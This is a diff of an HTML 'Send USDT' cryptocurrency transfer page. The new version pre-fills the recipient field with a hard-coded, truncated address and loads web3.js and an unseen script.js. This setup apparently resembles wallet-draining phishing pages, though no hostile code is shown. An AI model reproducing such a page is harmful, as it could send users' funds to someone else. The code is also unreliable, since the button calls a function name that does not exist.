@@ -1,199 +1,147 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Send USDT</title>
-    <style>
-        /* Basic CSS for styling the page */
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Send USDT</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #0d0d0d;
+      color: white;
+      font-family: Arial, sans-serif;
+    }
 
-        :root {
-            --background-color: #121212;
-            --container-bg: #1E1E1E;
-            --input-bg: #2C2C2C;
-            --text-primary: #FFFFFF;
-            --text-secondary: #AAAAAA;
-            --accent-color: #007BFF;
-            --border-color: #333333;
-        }
+    .container {
+      max-width: 400px;
+      margin: 0 auto;
+      padding: 20px;
+    }
 
-        body {
-            font-family: 'Inter', sans-serif;
-            background-color: var(--background-color);
-            color: var(--text-primary);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: bold;
+      color: #ccc;
+    }
 
-        .transaction-container {
-            width: 100%;
-            max-width: 400px;
-            background-color: var(--container-bg);
-            padding: 24px;
-            border-radius: 16px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.25);
-            box-sizing: border-box;
-            margin: 20px;
-        }
+    .input-group {
+      display: flex;
+      align-items: center;
+      background-color: #1a1a1a;
+      border: 1px solid #333;
+      border-radius: 8px;
+      padding: 10px;
+      margin-bottom: 20px;
+    }
 
-        .header {
-            text-align: center;
-            margin-bottom: 24px;
-        }
+    input[type="text"],
+    input[type="number"] {
+      flex: 1;
+      background-color: transparent;
+      border: none;
+      color: white;
+      outline: none;
+      font-size: 16px;
+    }
 
-        .header h2 {
-            margin: 0;
-            font-size: 24px;
-            font-weight: 600;
-        }
+    .input-group button {
+      margin-left: 10px;
+      background-color: transparent;
+      color: #00ff99;
+      border: none;
+      cursor: pointer;
+      font-size: 14px;
+    }
 
-        .input-group {
-            margin-bottom: 20px;
-        }
+    .usd-value {
+      margin-top: -10px;
+      margin-bottom: 20px;
+      color: #999;
+    }
 
-        .input-group label {
-            display: block;
-            font-size: 14px;
-            font-weight: 500;
-            color: var(--text-secondary);
-            margin-bottom: 8px;
-        }
+    .next-button {
+      width: 100%;
+      background-color: #00cc66;
+      color: white;
+      padding: 15px;
+      font-size: 18px;
+      font-weight: bold;
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+    }
 
-        .input-wrapper {
-            position: relative;
-            display: flex;
-            align-items: center;
-        }
+    .icon {
+      width: 18px;
+      height: 18px;
+      fill: #00ff99;
+      vertical-align: middle;
+    }
 
-        .input-field {
-            width: 100%;
-            padding: 12px 16px;
-            background-color: var(--input-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            color: var(--text-primary);
-            font-size: 16px;
-            transition: border-color 0.3s;
-        }
-        
-        .input-field:focus {
-            outline: none;
-            border-color: var(--accent-color);
-        }
-
-        .input-field::placeholder {
-            color: var(--text-secondary);
-        }
-
-        .input-icons {
-            display: flex;
-            align-items: center;
-            position: absolute;
-            right: 12px;
-            gap: 8px;
-        }
-
-        .icon-btn {
-            background: none;
-            border: none;
-            cursor: pointer;
-            padding: 4px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .icon-btn svg {
-            width: 20px;
-            height: 20px;
-            color: var(--text-secondary);
-            transition: color 0.3s;
-        }
-
-        .icon-btn:hover svg {
-            color: var(--text-primary);
-        }
-
-        #amount-input {
-            padding-right: 70px; /* Space for the currency symbol */
-        }
-        
-        .currency-symbol {
-            position: absolute;
-            right: 16px;
-            color: var(--text-primary);
-            font-weight: 600;
-        }
-
-        .min-amount-note {
-            font-size: 12px;
-            color: var(--text-secondary);
-            margin-top: 8px;
-        }
-
-        .next-btn {
-            width: 100%;
-            padding: 14px;
-            background-color: var(--accent-color);
-            border: none;
-            border-radius: 8px;
-            color: white;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
-
-        .next-btn:hover {
-            background-color: #0056b3;
-        }
-
-    </style>
+    .input-group svg {
+      margin-left: 8px;
+      cursor: pointer;
+    }
+  </style>
 </head>
 <body>
-
-    <div class="transaction-container">
-        <div class="header">
-            <h2>Send USDT</h2>
-        </div>
-        
-        <div class="input-group">
-            <label for="wallet-address">Address or domain</label>
-            <div class="input-wrapper">
-                <input type="text" id="wallet-address" class="input-field" placeholder="Enter recipient's address">
-                <div class="input-icons">
-                    <button class="icon-btn" title="Scan QR code">
-                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 7V5a2 2 0 0 1 2-2h2"/><path d="M17 3h2a2 2 0 0 1 2 2v2"/><path d="M21 17v2a2 2 0 0 1-2 2h-2"/><path d="M7 21H5a2 2 0 0 1-2-2v-2"/><path d="M7 12h10"/></svg>
-                    </button>
-                    <button class="icon-btn" title="Paste from clipboard">
-                         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"/><rect x="8" y="2" width="8" height="4" rx="1" ry="1"/></svg>
-                    </button>
-                </div>
-            </div>
-        </div>
-
-        <div class="input-group">
-            <label for="contract-address">Contract Address</label>
-            <div class="input-wrapper">
-                <input type="text" id="contract-address" class="input-field" value="0xdAC17F958D2ee523a2206206994597C13D831ec7">
-            </div>
-        </div>
-
-        <div class="input-group">
-            <label for="amount-input">Amount</label>
-            <div class="input-wrapper">
-                <input type="number" id="amount-input" class="input-field" placeholder="0.00" min="0.5" step="0.01">
-                <span class="currency-symbol">USDT</span>
-            </div>
-            <p class="min-amount-note">Minimum amount: 0.5 USDT</p>
-        </div>
-
-        <button class="next-btn" id="next-button">Next</button>
+  <div class="container">
+    <label for="address">Address or Domain Name</label>
+    <div class="input-group">
+      <input type="text" id="address" value="0x1384ebBC982d61ca4f40E9" />
+      <button onclick="pasteAddress()">Paste</button>
+      <svg class="icon" viewBox="0 0 24 24">
+        <path d="M3 3h6v2H5v14h14v-4h2v6H3V3zm18-1v8h-8V2h8zm-2 2h-4v4h4V4zm-8 6h10v2H11v-2zm0 4h10v2H11v-2zm0 4h6v2h-6v-2z"/>
+      </svg>
     </div>
 
+    <label for="amount">Amount</label>
+    <div class="input-group">
+      <input type="number" id="amount" placeholder="USDT Amount" oninput="updateUSD()" />
+      <span style="margin-left: 10px;">USDT</span>
+      <button onclick="setMax()">Max</button>
+    </div>
+
+    <div class="usd-value" id="usdValue">≈ $0.00</div>
+
+    <button id="Next" class="next-button" onclick="Next()">Next</button>
+  </div>
+
+  <script>
+    function pasteAddress() {
+      navigator.clipboard.readText().then((text) => {
+        document.getElementById('address').value = text;
+      });
+    }
+
+    function setMax() {
+      const maxAmount = 100; // Change as needed
+      document.getElementById("amount").value = maxAmount;
+      updateUSD();
+    }
+
+    function updateUSD() {
+      const amount = parseFloat(document.getElementById("amount").value || "0");
+      const usdValue = amount * 1; // USDT assumed 1:1
+      document.getElementById("usdValue").innerText = `≈ $${usdValue.toFixed(2)}`;
+    }
+
+    function next() {
+      const address = document.getElementById("address").value;
+      const amount = document.getElementById("amount").value;
+      if (!address || !amount) {
+        alert("Please fill in both address and amount.");
+        return;
+      }
+      // You can redirect or handle form here
+      console.log("Sending to:", address, "Amount:", amount);
+    }
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+  <script src="script.js"></script>
+  
 </body>
 </html>
